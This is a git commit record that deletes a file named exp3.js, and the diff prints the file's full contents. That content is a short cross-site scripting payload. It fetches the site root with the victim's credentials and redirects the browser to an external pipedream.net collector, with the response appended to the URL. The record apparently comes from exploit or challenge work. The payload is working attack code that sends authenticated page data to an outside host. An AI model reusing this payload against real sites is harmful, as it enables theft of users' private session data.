1ff64dc2ffe27ef03eb32cf63d3458c4c514fb9e
Ainsetin <49061007+bww9641@users.noreply.github.com>
2022-09-03 21:33:11 +0900

    Delete exp3.js

--- js/exp3.js
+++
@@ -1,6 +0,0 @@
-var xhr = new XMLHttpRequest();
-xhr.onreadystatechange = function() {
-   document.location.replace('https://eo6idxeb7noua1k.m.pipedream.net?q='+xhr.response);
-}
-xhr.open('GET','/',true);
-xhr.withCredentials = true;xhr.send(null);
